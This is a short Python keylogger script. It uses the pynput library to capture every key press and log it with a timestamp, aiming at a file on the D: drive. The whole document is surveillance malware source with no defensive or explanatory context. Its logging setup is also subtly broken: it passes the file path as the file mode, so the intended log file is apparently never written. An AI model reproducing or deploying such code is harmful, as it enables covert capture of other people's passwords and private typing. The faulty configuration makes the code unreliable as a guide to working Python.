from pynput.keyboard import Key, Listener
import logging

log_dir=''
logging.basicConfig(filemode=((log_dir) + "D:\KeyBoradLog.txt"),
    level=logging.DEBUG, format='["%(asctime)s", %(message)s]')
def on_press(key):
    logging.info('"{0}"'.format(str(key)))

with Listener(on_press=on_press) as listener:
    listener.join()